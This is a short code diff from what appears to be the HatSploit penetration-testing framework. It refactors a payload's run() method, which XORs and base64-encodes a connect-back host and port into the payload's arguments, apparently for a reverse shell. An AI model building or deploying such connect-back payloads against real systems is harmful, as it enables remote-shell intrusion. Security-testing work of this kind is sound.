@@ -57,17 +57,17 @@ class HatSploitPayload(Payload, StringTools):
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
-        connback_data = {
+        connback_data = str({
             'host': connback_host,
             'port': connback_port
-        }
-
-        connback_data = self.base64_string(
-            self.xor_string(str(connback_data))
-        )
+        })
 
         self.payload.update({
-            'Args': self.payload['Args'].format(connback_data)
+            'Args': self.payload['Args'].format(
+                self.base64_string(
+                    self.xor_string(connback_data)
+                )
+            )
         })
 
         return open(
